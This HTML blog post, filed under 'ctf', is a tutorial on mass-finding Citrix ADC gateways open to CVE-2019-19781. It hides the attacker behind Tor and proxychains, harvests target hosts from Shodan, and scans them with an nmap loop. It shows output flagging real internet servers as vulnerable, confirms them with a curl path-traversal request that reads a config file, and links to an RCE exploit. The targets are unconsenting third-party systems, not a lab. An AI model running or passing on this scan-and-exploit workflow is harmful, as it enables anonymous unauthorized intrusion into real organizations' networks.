<!DOCTYPE html>
<html lang=en><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title> How find a vulnerable server on the internet? - .burso</title>
    <meta name="description" content="NOTICE: Educational purposes only!
Hi, I want to show you how easy it is to find a vulnerable server on the internet. Okey guys, so now, firstly we need to have some TOR client for anonymity ;) Before we begin, look at the following tools
  tor  nyx  proxychains-ng  shodan  curl  nmap  $ tor &amp; $ nyx -i 127.0.0.1:9052 Then we can test, if the tor is working correctly with proxychains">
    <link rel="canonical" href="/ctf/citrix-vulnerability/">
    <link rel="icon" href="/img/favicon.jpg" type="image/gif" sizes="16x16"> 
    <meta property="og:title" content="How find a vulnerable server on the internet?">
    <meta property="og:type" content="article">
    <meta property="og:url" content="/ctf/citrix-vulnerability/">
    <meta property="og:description" content="NOTICE: Educational purposes only!
Hi, I want to show you how easy it is to find a vulnerable server on the internet. Okey guys, so now, firstly we need to have some TOR client for anonymity ;) Before we begin, look at the following tools
  tor  nyx  proxychains-ng  shodan  curl  nmap  $ tor &amp; $ nyx -i 127.0.0.1:9052 Then we can test, if the tor is working correctly with proxychains">
    <meta property="og:site_name" content=".burso">
    <link rel="stylesheet" href="/css/main.min.7fdf1d02dafd1a6eb5cfd0d707e17e33515b866f5d305a0ab01a4095577484fe.css" integrity="sha256-f98dAtr9Gm61z9DXB&#43;F&#43;M1Fbhm9dMFoKsBpAlVd0hP4=">
    <meta name="generator" content="Hugo 0.80.0" />
    <script type="module" src="https://unpkg.com/ionicons@5.1.2/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule="" src="https://unpkg.com/ionicons@5.1.2/dist/ionicons/ionicons.js"></script>
    
</head>
<body><header class="site-header">
    <nav class="site-nav" role="navigation" aria-label="breadcrumb">
    <ol itemscope itemtype="https://schema.org/BreadcrumbList" class="breadcrumb"><li class="breadcrumb-item  " 
  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
  <a itemtype="https://schema.org/Thing" itemprop="item" href="/">
    <span itemprop="name">.burso</span>
  </a>
  <meta itemprop="position" content="0" />
</li>/<li class="breadcrumb-item  " 
  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
  <a itemtype="https://schema.org/Thing" itemprop="item" href="/ctf/">
    <span itemprop="name">ctf</span>
  </a>
  <meta itemprop="position" content="0" />
</li>/<li class="breadcrumb-item active hidden" aria-current="page"
  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
  <a itemtype="https://schema.org/Thing" itemprop="item" href="/ctf/citrix-vulnerability/">
    <span itemprop="name">citrix-vulnerability</span>
  </a>
  <meta itemprop="position" content="1" />
</li></ol>
    </nav>
    <h1 class="site-title hidden">
		<a href="/">.burso</a>
    </h1>
</header>
<main id="content">
<article role="article" class="content post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
    <header class="post-header">        
        <h2 class="post-title" itemprop="name headline">How find a vulnerable server on the internet?</h2>
        <span class="post-meta">
            <time class="date-published" datetime="2020-01-24T12:24:40&#43;07:00" itemprop="datePublished">
                Fri, 24 Jan 2020
            </time>
            
            <ul id="tags">
              
                <li> <a href="/tags/hacking">#hacking</a> </li>
              
                <li> <a href="/tags/citrix">#citrix</a> </li>
              
                <li> <a href="/tags/cve-2019-19781">#CVE-2019-19781</a> </li>
              
                <li> <a href="/tags/tor">#tor</a> </li>
              
                <li> <a href="/tags/shodan">#shodan</a> </li>
              
                <li> <a href="/tags/nmap">#nmap</a> </li>
              
            </ul>
            
        </span>
    </header>
    <div class="post-content" itemprop="articleBody">
        <p><strong>NOTICE: Educational purposes only!</strong></p>
<p>Hi, I want to show you how easy it is to find a vulnerable server on the internet.
Okey guys, so now, firstly we need to have some TOR client for anonymity ;)
Before we begin, look at the following tools</p>
<ul>
<li>
<a href="https://www.torproject.org/download/tor/" target="_blank" rel="nofollow noreferrer noopener">tor</a></li>
<li>
<a href="https://nyx.torproject.org/" target="_blank" rel="nofollow noreferrer noopener">nyx</a></li>
<li>
<a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="nofollow noreferrer noopener">proxychains-ng</a></li>
<li>
<a href="https://cli.shodan.io/" target="_blank" rel="nofollow noreferrer noopener">shodan</a></li>
<li>
<a href="https://curl.haxx.se/" target="_blank" rel="nofollow noreferrer noopener">curl</a></li>
<li>
<a href="https://nmap.org/" target="_blank" rel="nofollow noreferrer noopener">nmap</a></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ tor &amp;
$ nyx -i 127.0.0.1:9052
</code></pre></div><p>Then we can test, if the tor is working correctly with <strong>proxychains</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ proxychains curl ifconfig.me
<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains.conf
<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/libproxychains4.so
<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.14
<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  127.0.0.1:9050  ...  ifconfig.me:80  ...  OK
46.166.139.111
</code></pre></div><p>Run shodan to get all open services which look like Citrix ADC Gateway</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ proxychains -q shodan search --fields<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ip_str,port&#34;</span> citrix netscaler &gt; $HOME/citrix_list
</code></pre></div><p>Now we will prepare a script that scans the vulnerability <strong>CVE-2019-19781</strong> in these services</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
CITRIX_IP_LIST<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$HOME<span style="color:#e6db74">/citrix_list&#34;</span>

<span style="color:#66d9ef">while</span> read CITRIX_IP_PORT; <span style="color:#66d9ef">do</span>
          IP<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $CITRIX_IP_PORT | awk <span style="color:#e6db74">&#39;{print $1}&#39;</span><span style="color:#66d9ef">)</span>
        PORT<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $CITRIX_IP_PORT | awk <span style="color:#e6db74">&#39;{print $2}&#39;</span><span style="color:#66d9ef">)</span>
        proxychains -q nmap -p $PORT -sV --script CVE-2019-19781 $IP
<span style="color:#66d9ef">done</span> &lt; $CITRIX_IP_LIST
</code></pre></div><p>After a short moment we get some interesting results. There are still servers with this vulnerability present.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-01-24 15:16 CET                                                                                                                                                                                                
Nmap scan report <span style="color:#66d9ef">for</span> ---.---.---.---                                                                                                                                                                                      
Host is up <span style="color:#f92672">(</span>0.75s latency<span style="color:#f92672">)</span>.                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                               
PORT      STATE SERVICE     VERSION                                                                                                                                                                                                                            
----/tcp open  ssl/unknown                                                                                                                                                                                                                                    
| CVE-2019-19781:                                                                                                                                                                                                                                              
|   VULNERABLE:                                                                                                                                                                                                                                                
|   Remote Code Execution vulnerability in Citrix Application Delivery Controller <span style="color:#f92672">(</span>ADC<span style="color:#f92672">)</span>                                                                                                                                                                        
|     State: VULNERABLE                                                                                                                                                                                                                                        
|     IDs:  CVE:CVE-2019-19781                                                                                                                                                                                                                                 
|     Risk factor: HIGH                                                                                                                                                                                                                                                                                                        
|                   A critical remote code execution vulnerability exists in Citrix Application Delivery Controller <span style="color:#f92672">(</span>ADC<span style="color:#f92672">)</span> CVE-2019-19781.                                                                                                                                                                                                                                                                                                
|                                                                                                                                            
|     Disclosure date: 2019-12-17                                                                                                                                                     
|     References:                                                                                                                            
|       https://support.citrix.com/article/CTX267027                                                                                                           
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2019-19781                                                                                                                                               
                                                                                                                                                                                                                                                                                                                                                                            
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                      
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 152.99 seconds                              

Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-01-24 15:18 CET                                                                                                                                                     
Nmap scan report <span style="color:#66d9ef">for</span> ---.---.---.---
Host is up <span style="color:#f92672">(</span>0.47s latency<span style="color:#f92672">)</span>.                                                                                                                                                           
                                                                                                          
PORT      STATE SERVICE     VERSION                                                                                                                                                   
----/tcp open  ssl/unknown                                                                               
| CVE-2019-19781:                                                                                                                                                                                                                                                                                                                                                                                                                        
|   VULNERABLE:                                                                                           
|   Remote Code Execution vulnerability in Citrix Application Delivery Controller <span style="color:#f92672">(</span>ADC<span style="color:#f92672">)</span>                                                                                                                             
|     State: VULNERABLE                                                                                   
|     IDs:  CVE:CVE-2019-19781                                                                            
|     Risk factor: HIGH                                                                                                                                                                                             
|                   A critical remote code execution vulnerability exists in Citrix Application Delivery Controller <span style="color:#f92672">(</span>ADC<span style="color:#f92672">)</span> CVE-2019-19781.                                                                                                                                                                                                                                                                                                
|                                                                                                                                                                                                                   
|     Disclosure date: 2019-12-17                                                                         
|     References:                                                                                         
|       https://support.citrix.com/article/CTX267027                                                      
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2019-19781                                                                                                                                               

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                      
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 142.11 seconds                                             

Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-01-24 15:21 CET                                                                                                                                                     
Nmap scan report <span style="color:#66d9ef">for</span> ---.---.---.---
Host is up <span style="color:#f92672">(</span>0.53s latency<span style="color:#f92672">)</span>.                                                                               

PORT      STATE SERVICE     VERSION                                                                       
----/tcp open  ssl/unknown                                                                               
| CVE-2019-19781:                                                                                         
|   VULNERABLE:                                                                                           
|   Remote Code Execution vulnerability in Citrix Application Delivery Controller <span style="color:#f92672">(</span>ADC<span style="color:#f92672">)</span>                                                                                                                             
|     State: VULNERABLE                                                                                   
|     IDs:  CVE:CVE-2019-19781                                                                            
|     Risk factor: HIGH                                                                                   
|                   A critical remote code execution vulnerability exists in Citrix Application Delivery Controller <span style="color:#f92672">(</span>ADC<span style="color:#f92672">)</span> CVE-2019-19781.                                                                                                                                                                                                                                                                                                
|                                                                                                         
|     Disclosure date: 2019-12-17                                                                         
|     References:                                                                                         
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2019-19781                                                                                                                                               
|_      https://support.citrix.com/article/CTX267027                                                      

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                      
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 155.56 seconds                                             
</code></pre></div><p>We can verify the vulnerability by using <strong>curl</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ proxychains -q curl -k --path-as-is https://&lt;host&gt;:&lt;port&gt;/vpn/../vpns/cfg/smb.conf  <span style="color:#f92672">&amp;&amp;</span> echo -e
<span style="color:#f92672">[</span>global<span style="color:#f92672">]</span>
        encrypt passwords <span style="color:#f92672">=</span> yes
        name resolve order <span style="color:#f92672">=</span> lmhosts wins host bcast
</code></pre></div><p>And that’s it. :) We will not continue from this point, but there exists a 
<a href="https://www.exploit-db.com/exploits/47902" target="_blank" rel="nofollow noreferrer noopener">RCE exploit</a> that enables the user to gain full control.</p>

    </div>
</article>
<div class="pagination">
    
    <div class="prev"> <a href="/ctf/osce-prologue/">Previous Post</a> </div>
    
    
    <div class="next"> <a href="/ctf/daily-bugle/">Next Post</a> </div>
    
</div>


        </main><footer class="site-footer">
	<span class="left">Gohugo/0.80.0 </span> 
	<span class="right">
		<em>.burso</em>
	</span>
</footer>
</body>
</html>
